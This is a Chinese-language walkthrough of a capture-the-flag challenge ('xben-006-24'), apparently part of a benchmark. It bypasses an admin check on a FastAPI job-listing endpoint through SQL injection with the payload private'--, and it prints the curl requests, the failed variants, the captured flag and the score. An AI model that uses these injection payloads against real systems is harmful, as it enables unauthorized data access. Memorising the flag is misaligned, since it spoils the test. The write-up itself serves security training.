# xben-006-24 · 探索记录

对应题解：[`xben-006-24.md`](./xben-006-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`server: uvicorn`（FastAPI）。
首页 `Ultimate Job Aggregator`：一个下拉框筛选岗位，选项 `All` / `back-end` / `front-end` / `private`。

前端逻辑直接写在 HTML 里：

```javascript
const jobType = document.getElementById('job-type').value;
const response = await fetch('/jobs', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ job_type: jobType })
});
// 然后把 data 逐行拼成表格，插入 resultDiv.innerHTML
```

`/openapi.json` 显示只有三个路由（`POST /jobs`、`GET /ping`、`GET /`），
且 `/jobs` 的 requestBody schema 是空的 `{}`——说明它读原始 body，没有 pydantic 模型约束。

## 第一阶段：枚举与 ID 缺口

```bash
curl -sS -H 'Content-Type: application/json' -d '{"job_type":""}' http://$T/jobs
```

```json
[{"id":1,"name":"Senior Frontend Dev","type":"front-end","description":"reactjs"},
 {"id":2,"name":"Staff Backend Python","type":"back-end","description":"django"},
 {"id":4,"name":"Frontend Dev","type":"front-end","description":"angular"}]
```

**id 是 1、2、4 —— 缺 3。** 结合下拉框里有 `private` 选项，几乎可以确定 id=3 就是那条私有岗位。

## 第二阶段：私有分支被挡住

```bash
curl -sS -H 'Content-Type: application/json' -d '{"job_type":"private"}' http://$T/jobs
# 403 {"detail": "Only admins can see private jobs"}
```

先找"怎么成为 admin"。把能想到的都试了一遍：

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| `X-UserId: 1` / `X-Admin: 1` / `X-Role: admin` / `Role: admin` | 403 | 头被忽略 |
| `Authorization: Bearer admin` | 403 | 无 token 机制 |
| `{"job_type":"private","id":3}` | 403 | 多余字段被忽略 |
| `{"job_type":"private","role":"admin"}` | 403 | 同上 |

`/jobs/3`、`/job/3`、`/api/jobs/3` 全部 404 —— 没有单条读取接口。
`/jobs/?job_id=3` 返回 307（重定向到 `/jobs`），跟随后仍返回全部非私有岗位。

**结论：没有 admin 入口，鉴权就是那条硬编码字符串判断。**

## 第三阶段：确认过滤语义是 `=` 而不是 `LIKE`

既然是"精确比较才拦"，先确认过滤本身是否模糊匹配：

| 输入 | 结果 | 推论 |
| --- | --- | --- |
| `PRIVATE` | 200 `[]` | 大小写敏感（不是 SQLite 的 LIKE 默认行为） |
| ` private` / `private ` | 200 `[]` | 不做 trim |
| `priv%` | 200 `[]` | **不支持通配符**，是 `=` 不是 `LIKE` |
| `%` | 200 `[]` | 同上 |
| `privat_` | 200 `[]` | 同上 |

所以通配符类绕过不成立。但这也说明：服务端把字符串**原样**用在查询里。

## 第四阶段：类型混乱暴露实现

| 输入 | 结果 |
| --- | --- |
| `{"job_type":null}` | 500 |
| `{"job_type":["private"]}` | 500 |
| `{"job_type":"private\u0000"}` | 500 |

数组和 null 都 500，说明服务端对它做了字符串操作（拼接）。
**这是"该参数可能进 SQL"的一个廉价信号**——如果只是个白名单 `if`，数组最多是"不匹配"，
不会 500。

## 第五阶段：check-vs-use 绕过

真正的突破口是意识到**鉴权和查询是两条独立路径**：

```python
if job_type == "private":          # 字符串比较
    return 403
sql = f"SELECT ... WHERE type = '{job_type}'"   # 字符串拼接
```

只要构造一个值，让这两条路径对它的理解不同即可。

| payload | 结果 | 说明 |
| --- | --- | --- |
| `private'--` | **200，返回 id=3 + flag** | 鉴权：不等于 `private`，放行；SQL：`type='private'--'`，等价于 private |
| `private' OR '1'='1` | 500 | 该后端对多引号解析差异，语法失败 |

`private'--` 成功：

```json
[{"id":3,"name":"Hidden job","type":"private",
  "description":"flag{4022cc5c-f1d0-4a9e-919f-ef89fb0130c0}"}]
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 规模 | 结果 | 判据 |
| --- | --- | --- | --- |
| 找 admin 认证（5 种头、Bearer） | 8 组 | 全 403 | 头被忽略，无 token 机制 |
| body 加 `id` / `role` 字段 | 2 组 | 403 | 多余字段被忽略 |
| 单条读取接口（`/jobs/3`、`/job/3`、`/api/jobs/3`） | 3 个 | 全 404 | openapi 也只有 3 个路由 |
| `/jobs/?job_id=3` | 1 | 307 → 仍返回非私有 | 查询参数未使用 |
| 大小写/空格变体（`PRIVATE`、` private`、`private `） | 3 | 200 `[]` | 精确 `=` 匹配 |
| 通配符（`priv%`、`%`、`privat_`） | 3 | 200 `[]` | 不是 `LIKE`，通配符无效 |
| `private' OR '1'='1` | 1 | 500 | 后端语法差异，改注释符即可 |
| 类型混乱（`null`、数组、`\u0000`） | 3 | 500 | **这一步是正向信号**，指向字符串拼接 |

## 这次真正的收获

1. **ID 缺口是最强的线索。** `1,2,4` 缺 `3` 直接说明"有一条记录被隐藏"，
   比看完整个页面再猜参数快得多。任何列表接口都应该先看 ID 是否连续。
2. **检查与使用不一致（check-vs-use）是绕过鉴权的通用模式。**
   鉴权用 `==` 比较、查询用字符串拼接时，构造一个"两边理解不同"的值即可。
   判断这类题成立的前提是：**同一个输入同时流向"权限判断"和"数据查询"**。
3. **通配符先试，能立刻区分 `LIKE` 和 `=`。** `%` 返回空 = 精确匹配，
   于是放弃"语义层绕过"，转向"语法层绕过"。
4. **500 是正向信号。** 数组/null 导致 500，说明服务端对参数做字符串处理，
   而不是白名单校验。这类"实现暴露"应当主动去制造（传错类型），成本 1 个请求。
5. **注释符比 `OR 1=1` 更稳。** 本题 `OR` 版本 500，`--` 版本 200。
   闭合剩余语法（`--`、`#`、`/* */`）通常比构造完整条件更少受后端差异影响。
